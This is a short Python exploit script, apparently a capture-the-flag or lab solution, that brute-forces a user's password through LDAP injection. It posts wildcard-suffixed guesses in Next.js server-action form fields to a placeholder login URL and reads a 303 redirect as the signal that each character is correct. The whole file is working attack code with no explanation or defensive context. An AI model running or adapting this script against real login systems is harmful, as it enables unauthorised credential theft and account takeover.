import requests
import string

username = "test"
password = ""
chars = string.printable[:-5]
headers = {"Next-Action": "test"}

while True:
        for c in chars:
                print(f"\rPassword for {username}: {password}{c}", end="")
                files = {
                        "1_ldap-username": (None, username),
                        "1_ldap-secret": (None, f"{password}{c}*"),
                        "0": (None, '[{},"$K1"]'),                                            
                }

                response = requests.post(
                        'http://yourmom:1234/login',
                        headers=headers,
                        files=files
                        )
                if response.status_code == 303:
                        password += c
                        break
        else:
            print()
            break
